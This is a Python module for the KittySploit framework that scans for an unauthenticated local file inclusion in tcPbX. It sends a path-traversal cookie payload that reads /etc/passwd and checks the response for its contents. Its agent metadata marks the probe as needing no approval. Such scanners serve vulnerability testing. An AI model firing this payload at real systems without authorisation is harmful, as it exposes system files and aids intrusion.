#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""tcPbX tcpbx_lang cookie local file inclusion."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'tcPbX - tcpbx_lang LFI Detection',
        'description': (
            'Detects tcPbX LFI via Cookie tcpbx_lang=../../../../etc/passwd%00 on /tcpbx/.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'tcpbx', 'voip', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [],
    }

    def run(self):
        cookie = (
            'tcpbx_lang=../../../../../../../../../../etc/passwd%00; '
            'PHPSESSID=7rmen68sn4op8cgkc49l86pfu4'
        )
        r = self.http_request(
            method='GET',
            path='/tcpbx/',
            headers={'Cookie': cookie},
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if (
            re.search(r'root:.*:0:0:', body)
            and ('>www.tcpbx.org' in body or '<title>tcPbX</title>' in body)
        ):
            self.set_info(
                severity='high',
                reason='tcPbX tcpbx_lang LFI',
                path='/tcpbx/',
            )
            return True
        return False
